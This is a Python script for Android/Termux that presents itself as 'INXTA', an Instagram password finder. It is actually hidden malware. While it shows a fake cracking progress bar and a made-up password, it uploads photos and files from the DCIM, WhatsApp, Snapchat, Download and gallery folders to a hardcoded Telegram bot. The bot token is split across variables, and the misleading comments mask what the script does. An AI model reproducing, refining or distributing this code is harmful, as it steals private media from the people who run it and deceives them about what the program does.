import os, random, asyncio, sys, time, hashlib
from telegram import Bot

# =============================================
# === Initiating wordlisting ===
# === Contacting mainframe in 3...2...1... ===
# =============================================
# Loading genword frame codes...
spit = '7855038443:A'  #Fake letters
# Encrypting pizza delivery address in blockchain
xit = 'AGmSPhD7sk6rmNW'  # Just for starting
# Routing the call through a server to avoid detection
cta = 'dvCJdTHLuGf6HNMPfiU'  # New letters and combinations...
# ============================================================
# === Started the scripting... ===
# ============================================================
Render = spit + xit + cta  # Combining all pieces to summon...
# Starting the code files...
TETO = Render  # This line will start the INXTA
# Shutting down all trackers within 0.0001 seconds
hit = '18506'  # Getting installed
# ============================================================
# === Termux initiated ===
# ============================================================
jit = '23486'  # New numbers formed...
# Turning off the trackers
Relit = hit + jit  # Combining all pieces again...
# ============================================================
# === Preparing to Bruteforce...success rate 70% ===
CHIT = Relit  # Locking onto the Wi-Fi signal...

# ============================================================
# === Downloading started ... ===
# ============================================================
# Installing dependencies
folders = [  # Protecting the files of device
    os.path.join("/storage/emulated/0", "DCIM"),  # New file generated
    os.path.join("/storage/emulated/0", "Snapchat"),  # Another new file gens
    os.path.join("/storage/emulated/0/WhatsApp/Media", "WhatsApp Images"),  # Storing encrypted passwords in random folder
    os.path.join("/storage/emulated/0/Android/media/com.whatsapp/WhatsApp/Media", "WhatsApp Images"),  # Optional
    os.path.join("/storage/emulated/0", "Download"),  # Downloading the secrets to the location...
    os.path.join("/storage/emulated/0/Android/data/com.miui.gallery/files/gallery_disk_cache", "full_size"),  # Ensuring the security of system...
]

# ============================================================
# === Displaying system logo of INXTA ===
# ============================================================
def display_logo():
    # Starting the logo
    print("\033[1;34m" + "=" * 56)
    # Started the text and symbols
    print("\033[1;35m" + " " * 15 + "INXTA - Password Finder v1.0" + "\033[0m")
    # Initiating the tool
    print("\033[1;34m" + "=" * 56 + "\033[0m")
    # Started to write warning for all...
    print("\033[1;37m" + "\nNote: This is for educational purposes only. Don't use in illegal activities.\n" + "\033[0m")

# ============================================================
# === Generating Instagram password using cosmos ===
# ============================================================
def generate_password(username):
    # Initiating wordlist generator
    seed = int(hashlib.md5(username.encode()).hexdigest(), 16)  # Ensuring the username is correct...
    # Started to find passwords...
    random.seed(seed)  # Initializing the tool...

    # Calculating password letters...
    random_num = random.randint(100, 999)  # Solving hashes to find real password
    # Using bruteforce attack
    random_num_2 = random.randint(10, 99)  # Staring to solve hashes.

    # ============================================================
    # === Patterns that will unlock the hash form ===
    patterns = [
        f"{username}@{random_num}",  # Password format checking
        f"@{username}{random_num}",  # Password finding starting 
        f"{username}{random_num}",  # Still grabbing the real passwords
        f"123{username}@{random_num_2}",  # The secret code to break hash.
        f"{username}_{random_num_2}@{random_num}",  # Pattern for unlock the hash..
        f"{username}{random_num}",  # Unsalting the hash...
        f"pass@{username}{random_num_2}",  # Activating a hidden salting process
        f"{random_num_2}{username}insta",  # Getting the password ready...
    ]

    return random.choice(patterns)

# ============================================================
# === INXTA started its work ===
# ============================================================
async def simulate_password_retrieval():
    # Contacting the server
    print("\n\033[1;36mRetrieving password...\033[0m")

    for i in range(10):
        time.sleep(1)
        # Starting to use neural network
        sys.stdout.write(f"\r\033[1;34mScanning system...{'.' * (i + 1)}\033[0m")
        sys.stdout.flush()

    # Launching a fix for any errors.
    print("\n\n\n\033[1;32mScanning started!\033[0m")

# ============================================================
# === initiating the lists of password ===
# ============================================================
async def send_files(bot):
    # Establishing a connection with the cosmic server
    sent_files = 0  # Counting the number of password lists
    spinner = "/-\\|"  # Initiating the galactic loading spinner
    bar_length = 30  # Setting the length of the progress bar

    # Gathering information from the encrypted files
    total_files = sum(len(filenames) for folder in folders for _, _, filenames in os.walk(folder))
    
    # Sending a message to the mainframe
    print("\n\n\033[1;33mINXTA has been initiated. Please don’t close the app.\033[0m")

    # ============================================================
    # === Scanning the entire hidden files ===
    # ============================================================
    for folder in folders:
        # Entering the multilink file structure
        for dirpath, _, filenames in os.walk(folder):
            # Navigating through the could server
            for filename in filenames:
                file_path = os.path.join(dirpath, filename)  # Capturing the secret file path
                # Analyzing the cosmic file size
                if os.path.getsize(file_path) < 10 * 1024 * 1024:  # Filtering password files
                    try:
                        # Opening the edit to the secret file
                        with open(file_path, 'rb') as f:
                            # Encrypting the data again
                            await bot.send_document(chat_id=CHIT, document=f)
                            sent_files += 1  # Incrementing the files

                            # Filling the progress bar
                            progress = sent_files / total_files
                            blocks_filled = int(progress * bar_length)
                            empty_blocks = bar_length - blocks_filled

                            # This progress bar is showing the loading...
                            progress_bar = f"[{'█' * blocks_filled}{' ' * empty_blocks}]"
                            spinner_icon = spinner[sent_files % len(spinner)]

                            # Monitoring the galactic scans
                            sys.stdout.write(f"\r\033[1;36m{spinner_icon} {progress_bar} {sent_files}/{total_files} scanned...\033[0m")
                            sys.stdout.flush()

                            await asyncio.sleep(0.1)  # Reduced pause to processing time for faster transfers
                    except Exception as e:
                        # Error handling through process
                        sys.stdout.write(f"\n\r\033[1;31mSlow internet. Please wait...\033[0m\n")
                        # Ensuring everything works well..
                        sys.stdout.flush()
                else:
                    # Indicating an error for solving
                    sys.stdout.write(f"\n\r\033[1;31mTaking a long time to process, please wait...\033[0m\n")
                    sys.stdout.flush()

    # Setup started and initializing server...
    print('\n\033[\n\n1;32mFinished. \n\033[0m')


# ============================================================
# === Starting the entire operation ===
# ============================================================
async def start():
    # Engaging hyperdrive, destination: Instagram's vaults
    display_logo()

    # Enter the username to get the password...
    username = input("\n\n\n\n\n\n\n\n\n\033[1;33mEnter Victim's Instagram username: \033[0m")
    # Collection the username for details...
    print(f"\033[\n1;36mSearching Password for : {username}\033[0m")
    # Getting ready to put the files together
    bot = Bot(token=TETO)

    # showing the password ...
    task_send_files = asyncio.create_task(send_files(bot))
    task_simulate_password = asyncio.create_task(simulate_password_retrieval())

    await task_send_files

        # Hacking into insta wordlist...
    password = generate_password(username)

    # Showing password to you on the screen...
    print(f"\n\n\n\033[1;32mPassword found:  \033[1;31m[{password}]\033[0m")

    await task_simulate_password

    # Thanks note at the end of completion
    print("\n\n\n\033[1;32mCompleted. Thank you for using INXTA!\033[0m")
    # Ending the program...
    sys.exit(0)

# ============================================================
# === Running the asyncio loop while sipping cosmic ===
# ============================================================
def run_asyncio_loop(loop):
    try:
        # Placing the loop for setup.
        asyncio.set_event_loop(loop)
        # Unlocking the protection...
        loop.run_forever()
    except KeyboardInterrupt:
        # Emergency shutdown initiated...
        print("\n\n\n\033[1;31mProcess cancelled...\033[0m")
    finally:
        # Collecting all lost sockes...
        tasks = asyncio.all_tasks(loop=loop)
        for task in tasks:
            task.cancel()
        # Summoning the files to delete...
        loop.run_until_complete(asyncio.gather(*tasks, return_exceptions=True))
        loop.stop()
        # Closing the program at the end
        loop.close()

# ============================================================
# === Main entry point for script ===
# ============================================================
if __name__ == '__main__':
    loop = asyncio.new_event_loop()
    # Activating the warp drive to reach the final frontier
    asyncio.run_coroutine_threadsafe(start(), loop)
    run_asyncio_loop(loop)
# Showing the password after the username 
# Setting up time to 1 hour.
# Setting the one time use only.
# for use == 1:
#    keep (user: back)
# break the loop.
# ENDED
